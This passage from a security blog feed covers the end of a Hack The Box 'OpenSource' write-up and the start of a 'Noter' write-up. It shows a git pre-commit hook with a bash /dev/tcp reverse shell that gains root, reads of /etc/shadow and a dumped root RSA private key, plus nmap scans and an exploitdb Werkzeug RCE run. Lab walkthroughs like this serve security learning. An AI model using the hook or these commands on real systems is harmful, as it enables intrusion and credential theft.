font-style: inherit;">-rw-rw-r--</span>  1 dev01 dev01  232 May 24 10:34 packed-refs</span>
<span id="cb7-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxr-x</span>  5 dev01 dev01 4096 May  4 16:35 refs</span>
<span id="cb7-18"></span>
<span id="cb7-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dev01@opensource:~/.git/hooks$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb7-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 60</span>
<span id="cb7-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxr-x</span> 2 dev01 dev01 4096 May 24 11:12 .</span>
<span id="cb7-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxr-x</span> 8 dev01 dev01 4096 May 24 11:19 ..</span>
<span id="cb7-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxrwxr-x</span> 1 dev01 dev01  478 Mar 23 01:18 applypatch-msg.sample</span>
<span id="cb7-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxrwxr-x</span> 1 dev01 dev01  896 Mar 23 01:18 commit-msg.sample</span>
<span id="cb7-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxrwxr-x</span> 1 dev01 dev01 3327 Mar 23 01:18 fsmonitor-watchman.sample</span>
<span id="cb7-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxrwxr-x</span> 1 dev01 dev01  189 Mar 23 01:18 post-update.sample</span>
<span id="cb7-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxrwxr-x</span> 1 dev01 dev01  424 Mar 23 01:18 pre-applypatch.sample</span>
<span id="cb7-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxrwxr-x</span> 1 dev01 dev01 1642 Mar 23 01:18 pre-commit.sample</span>
<span id="cb7-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxrwxr-x</span> 1 dev01 dev01 1492 Mar 23 01:18 prepare-commit-msg.sample</span>
<span id="cb7-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxrwxr-x</span> 1 dev01 dev01 1348 Mar 23 01:18 pre-push.sample</span>
<span id="cb7-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxrwxr-x</span> 1 dev01 dev01 4898 Mar 23 01:18 pre-rebase.sample</span>
<span id="cb7-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxrwxr-x</span> 1 dev01 dev01  544 Mar 23 01:18 pre-receive.sample</span>
<span id="cb7-33"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxrwxr-x</span> 1 dev01 dev01 3610 Mar 23 01:18 update.sample</span></code></pre></div>
<p>Git Hooks are scripts executed by the server when a commit is pushed to a repository. There are no pre-configured hooks, and for us to escalate privileges something has to be pushed / commited / updated. Upload <code>pspy64</code> to the victim and run it.</p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dev01@opensource:/dev/shm$</span> ./pspy64</span>
<span id="cb8-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb8-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/24</span> 09:02:01 CMD: UID=0    PID=11447  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">git</span> commit <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m</span> Backup for 2022-05-24 </span>
<span id="cb8-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/24</span> 09:02:01 CMD: UID=0    PID=11449  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/lib/git-core/git-remote-http</span> origin http://opensource.htb:3000/dev01/home-backup.git </span>
<span id="cb8-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/24</span> 09:02:01 CMD: UID=0    PID=11448  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">git</span> push origin main </span></code></pre></div>
<p>It seems like backups are commited frequently by <strong>UID 0</strong> (root), we should be able to exploit this by creating our own pre-commit / commit-msg / prepare-commit-msg script.</p>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dev01@opensource:~/.git/hooks$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span> pre-commit</span>
<span id="cb9-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxrwxr-x</span> 1 dev01 dev01 54 May 24 11:12 pre-commit</span>
<span id="cb9-3"></span>
<span id="cb9-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dev01@opensource:~/.git/hooks$</span> cat pre-commit</span>
<span id="cb9-5"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#!/bin/bash</span></span>
<span id="cb9-6"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">bash</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&amp;</span> /dev/tcp/10.10.15.17/4488 <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&amp;</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span></span></code></pre></div>
<p>Wait for the backup to be made and we should get our reverse shell!</p>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  chisel_1.7.7 nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lvnp</span> 4488</span>
<span id="cb10-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">listening</span> on <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">any</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> 4488 ...</span>
<span id="cb10-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span> to <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.15.17</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> from <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UNKNOWN</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[10.129.70.252]</span> 43612</span>
<span id="cb10-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bash:</span> cannot set terminal process group <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">21874</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span> Inappropriate ioctl for device</span>
<span id="cb10-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bash:</span> no job control in this shell</span>
<span id="cb10-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@opensource:/home/dev01#</span> id</span>
<span id="cb10-7"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb10-8"></span>
<span id="cb10-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@opensource:/home/dev01#</span> cat /root/root.txt</span>
<span id="cb10-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">6d931e05a808f004c7ec976de9be27ff</span></span>
<span id="cb10-11"></span>
<span id="cb10-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@opensource:/home/dev01#</span> cat /etc/shadow</span>
<span id="cb10-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$5</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sA85UVX</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$HupltM</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.bMqXkLc269pHDk1lryc4y5LV0FPMtT3x.yUdbe3mGziC8aUXWRQ2K3jX8mq5zItFAkAfDgPzH8EQ1C/:19072:0:99999:7:::</span></span>
<span id="cb10-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dev01:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$KxPkBXel$7</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">cqEmnerc0RmIaUGVdGLXlbC61.2x5bY0DLC/j2VDHG3mAaqeWFfQiuHOXmQss91XNn0FybSdfl51vFfKuwRh/:19073:0:99999:7:::</span></span>
<span id="cb10-15"></span>
<span id="cb10-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root@opensource:/home/dev01#</span> cat /root/.ssh/id_rsa</span>
<span id="cb10-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-----BEGIN</span> RSA PRIVATE KEY-----</span>
<span id="cb10-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MIIJKAIBAAKCAgEAwwPG6v8jiKw488NGHm0b1HPclB7gIM7D1rASiaKimF8cKlv7</span></span>
<span id="cb10-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Nhqprrg39wAFerkxKJ/U/J5NMZpWFJ2Hl4b1mrHFo5e7p2urwIcJ40Y3wBPO1L62</span></span>
<span id="cb10-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">S2UERAqlwuaxja1Uuus8xztAfQ9scYONxBA6YEOe+Arb5NDp37HoTq8/tBFSA4R4</span></span>
<span id="cb10-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bDGYwneZSDfJwJ9t0UwaBlpXs0+Tm77Dtx9s9Zj4thBvaGho93CkonXi5eBlgsCX</span></span>
<span id="cb10-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">EAJZi22aZdJNcXDSgRtA9o8FSyNTd4hsTr+iYN9taiDnXCbaC2geXuEYWl8/FBTr</span></span>
<span id="cb10-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">JXhBBuiIVeD3YhpuFah/LoLInh1E5HY6i7F7bkZBtWcowj39INswug8ijObeUiCo</span></span>
<span id="cb10-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SZuowSjgvJMstYv4NxRMt3UMNfqlbpIqMViLRNsVD+vHHm0WtJ/a0hk/dAb4Odft</span></span>
<span id="cb10-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">YuRptDMsgwKhDqkU53J9ujif0pb/n8qeW/MjD+FyFJnv4R65JmqfLGaoPhjRihQu</span></span>
<span id="cb10-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">EBlAh8KWQJOgIdiOn87dD/UR0BslD+lYCuuzI/ag0nZIzDhIO789rRCKTq9pAM4F</span></span>
<span id="cb10-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">fkiwOh6eMmctf8rkaoAmcN97UncHTnb/wIeG487hecL5ruThpHuOqSlV3sKylORN</span></span>
<span id="cb10-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">n6dl9bcRm5x+7UmWnMKlNpl7UtNaJ/f1SLOQzT2RBWJ9jlP5sA3zinMgKDECAwEA</span></span>
<span id="cb10-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">AQKCAgA9718nlyxj5b6YvHXyh9iE2t89M6kfAkv0TSs2By74kYxSb7AS+NjXIq6z</span></span>
<span id="cb10-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">hZA378ULD+gG6we9LzUTiwxbNYOfQ8JvOGtiurFrjfe39L8UA7Z2nrMqssRuD6uh</span></span>
<span id="cb10-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">gL73Lgtw6fD9nXXXwiRA0PUfRcAkfpVoVZqMy0TbxJbxFnt25uFTOKk+Q2ouqOlH</span></span>
<span id="cb10-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">pGAxCvFHvZGuXtbnnehVWHq0GAj030ZuHD4lvLNJkr7W0fXj6CaVJjFT5ksmGwMk</span></span>
<span id="cb10-33"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">P2xVEO3qDwvMwpN9z5RcrDkpsXcSqSMIx7Zy7+vkH4c1vuuLGCDicdpUpiKQ3R0f</span></span>
<span id="cb10-34"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mTk4MQixXDg4P1UT0lvk6x+g6hc22pG9zfPsUY85hJ+LllPxt/mD4y7xckq7WWGH</span></span>
<span id="cb10-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dJz5EnvooFYGiytmDbSUZwelqNT/9OKAx/ZGV8Bmk/C30a02c4hlUnwbx7+kyz+E</span></span>
<span id="cb10-36"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">DYrXX9srwm1gMj6Lw0GmXSVLlhhc2X2xc2H4RM8gKMKsMxHjR/eeXcaSJSefx6qY</span></span>
<span id="cb10-37"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/nOTlOQhxIl/EoIyAYrdqqRwtk67ZTcunVdDfuDvgBC2iblLTZYtyrwbd2rNc85Z</span></span>
<span id="cb10-38"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">rx5puvBI33X9n/PVRwx+JnRf/ZFu+JPa0btA5BC0CeA57CzIHjL7QA1Yo2Mp7FEn</span></span>
<span id="cb10-39"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1e/x5s001+ArIBwXxSHgnxWKR6yLHTk4+1rgJoFlukHuuOeCeQKCAQEA6NKNNQde</span></span>
<span id="cb10-40"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">efzSMym+wHh5XNNK7N86iD9lJdKzF6TPzb7e5Jclx3azlTNpDXgN+r8Rko05KCpz</span></span>
<span id="cb10-41"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">zgYRNP33hNjaBowiuS13eZP3S85iA0e24DYn/SofQhBZNADEhcq4Y4cPlMQwSV9/</span></span>
<span id="cb10-42"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">YtUaCiqkd4PvBLE10haT1llZOkhAOIno0vvjRWlQuagsLgfF76KZ95jYJgyE8DvM</span></span>
<span id="cb10-43"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+pHOM7Twl9yl57zcU/t+Pns0/PYieo+lzm64+KSy9dZ+g+SDyGmByeKs6wJTyG1d</span></span>
<span id="cb10-44"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">nuMAezeUT8O2WASKKOcqAakekevBb7UqeL63l3KB4FbyICEU3wg+W+eP00TOxVcs</span></span>
<span id="cb10-45"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ld2crNwJ2LngzwKCAQEA1m2zeme25DTpMCTkKU30ASj3c1BeihlFIjXzXc9o/Ade</span></span>
<span id="cb10-46"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">383i8BmXC7N6SzUxNas6axxlNc+0jxdZiv9YJt/GGSI1ou0auP4SxG782Uiau+ym</span></span>
<span id="cb10-47"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">pJ29D9B21LLTgqwfyuSnjHtg/jCMjQmZTguICSRHrRhnejCs8h+TTEdmmajB7t87</span></span>
<span id="cb10-48"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">EKgGOWeRVS5rYv2MXzzJkIqc7BaUjd/4fdR39VKbPWJaiKCdxf3CqG+W7d61Su4I</span></span>
<span id="cb10-49"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">g490YzF+VcFj5XwqM5NIpnzI+cKTKE8T2FbWgvMlv3urmHy2h7R179qBEIbaqt+s</span></span>
<span id="cb10-50"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">O9bK29YILa4kuQ/0NpDHauJJyzmsyhEA3E+/cV2m/wKCAQBsiXt6tSy+AbacU2Gx</span></span>
<span id="cb10-51"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">qHgrZfUP6CEJU0R8FXWYGCUn7UtLlYrvKc8eRxE6TjV2J4yxnVR//QpviTSMV7kE</span></span>
<span id="cb10-52"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">HXPGiZ3GZgPEkc4/cL8QeGYwsA6EXxajXau4KoNzO8Yp39TLrYo1KmfgUygIhUiW</span></span>
<span id="cb10-53"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ztKmhVZp0kypKI4INZZ6xQ/dC8Avo6EWa+fsrYMA6/SLEJ3zXvK6a6ZrSX2vbTKc</span></span>
<span id="cb10-54"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">GSjel5S/Mgbwac+R/cylBkJtsgBZKa6kHJJuOiGVVFpFG38xL6yPSyzR3VFkH8zs</span></span>
<span id="cb10-55"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">QnjHH5ao6tsSWxz9OcK7qOFb2M0NtTwGsYG+qK1qLBWmEpViEDm0labq2t0nWIze</span></span>
<span id="cb10-56"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lAjRAoIBAAab8wA+2iBGkTluqamsQW0XuijPvVo8VSksyIeHsRCzmXUEf44u+7zc</span></span>
<span id="cb10-57"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">l1RiG1YwJOjQQz5ZXJNcgOIL5Met9gkoSMbwz/YLvsBXO2vnFP3d2XURd5ZZMpBz</span></span>
<span id="cb10-58"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wpkwfPpf+doWo3KyRGLEfPku2c6OU7c+HVJi1bHQz1V2je8GiJO4RbXJuAdk7dHW</span></span>
<span id="cb10-59"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UHEIp5733K6b1yJfv8xvrtUSC3CAT1ChC3FSogpMPAe9CMXkK2pX0+NaNJgqGl7C</span></span>
<span id="cb10-60"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SzXzkcltLLwU9IzeNnLznQT6CDqZC/zO7wcQMQAVy9zMu1WrEmpZ4pElmbMU8cOW</span></span>
<span id="cb10-61"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">roMVvs0/wSXGO8gLywufYotn2drArDkCggEBAL+6b5CykyS1R6icAe5ztF2o4BiZ</span></span>
<span id="cb10-62"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">5KRf4TmH8fnm8quGKXqur/RdbM5xtTFFvrQ0roV3QNJfqb9SqC4Zm2URKfEFp1wq</span></span>
<span id="cb10-63"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Hc8eUHsFuVb/jEPpuQYIbDV6DzvJ2A5Jh2cOyTZNjJpE8KseAWuWpqLnCU2n7qmi</span></span>
<span id="cb10-64"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">fh36jyH9ED6qBmmlPs7alXM1nYfEyG9BjIcvQgt9Tv3hEOrC9Kwm/fKxy9tEiTNf</span></span>
<span id="cb10-65"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">GnmUCEKZSsgJ4y0py+bMomJKnMhDWGSjbB1RtBTMyz2K/KQ0EOkBAYbxQ+/MZu5G</span></span>
<span id="cb10-66"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">21kLS+mSxwwKm5XWZk8fyw4pBhlrCVyuSBK7UlHJTcNDhzcxxzqW2KYACUQ=</span></span>
<span id="cb10-67"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-----END</span> RSA PRIVATE KEY-----</span></code></pre></div>
<hr>
</section>
</section>
<section id="references" class="level1">
<h1>References</h1>
<p><strong>GiTea Hooks RCE</strong> https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce https://muirlandoracle.co.uk/2020/09/04/year-of-the-dog-write-up/ https://hngnh.com/posts/DevGuru-CTF-Writeup/</p>


</section>

 ]]></description>
  <category>hackthebox</category>
  <category>linux</category>
  <category>git</category>
  <category>python</category>
  <category>docker</category>
  <guid>https://exploit.se/posts/2022-05-24-htb-writeup-opensource/2022-05-24-htb-writeup-opensource.html</guid>
  <pubDate>Tue, 24 May 2022 00:00:00 GMT</pubDate>
  <media:content url="https://exploit.se/posts/2022-05-24-htb-writeup-opensource/images/opensource_logo.png" medium="image" type="image/png" height="144" width="144"/>
</item>
<item>
  <title>Noter - Hack The Box</title>
  <dc:creator>0xPThree </dc:creator>
  <link>https://exploit.se/posts/2022-05-23-htb-writeup-noter/2022-05-23-htb-writeup-noter.html</link>
  <description><![CDATA[ 





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<p><strong>nmap:</strong></p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  noter nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> 10.10.11.160 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-v</span></span>
<span id="cb1-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>     STATE SERVICE</span>
<span id="cb1-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">21/tcp</span>   open  ftp</span>
<span id="cb1-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span>   open  ssh</span>
<span id="cb1-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">5000/tcp</span> open  upnp</span>
<span id="cb1-6"></span>
<span id="cb1-7"></span>
<span id="cb1-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  noter nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sCV</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p21,22,5000</span> 10.10.11.160</span>
<span id="cb1-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>     STATE SERVICE VERSION</span>
<span id="cb1-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">21/tcp</span>   open  ftp     vsftpd 3.0.3</span>
<span id="cb1-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span>   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span> Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">protocol</span> 2.0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-12"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssh-hostkey:</span> </span>
<span id="cb1-13"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3072</span> c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-14"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">256</span> 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ECDSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-15"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ED25519</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">5000/tcp</span> open  http    Werkzeug httpd 2.0.2 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Python</span> 3.8.10<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-17"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> Noter</span>
<span id="cb1-18"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> Werkzeug/2.0.2 Python/3.8.10</span>
<span id="cb1-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Service</span> Info: OSs: Unix, Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CPE:</span> cpe:/o:linux:linux_kernel</span>
<span id="cb1-20"></span>
<span id="cb1-21"></span>
<span id="cb1-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  noter sudo nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sU</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--top-port</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>50 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--open</span> 10.10.11.160</span>
<span id="cb1-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE         SERVICE</span>
<span id="cb1-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">68/udp</span> open<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">filtered</span> dhcpc</span></code></pre></div>
<p>FTP is always fun, however from nmap it doesn’t seem like anonymous logins are enabled. Checking this manually confirms that’s the case.</p>
<p>Werkzeug has a known code execution if debug is enabled, quickly check with script in Kali.</p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  Downloads python2 /usr/share/exploitdb/exploits/multiple/remote/43905.py 10.10.11.160 5000 10.10.14.26 4488</span>
<span id="cb2-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[-]</span> Debug is not enabled</span></code></pre></div>
<p>Browse port 5000 and we are met with a very simple page. <img src="https://exploit.se/posts/2022-05-23-htb-writeup-noter/images/noter01.png" class="img-fluid"></p>
<p>Trying bacis authentication bypasses doesn’t give anything, so instead we create an account with credentials <code>admin:admin</code>.</p>
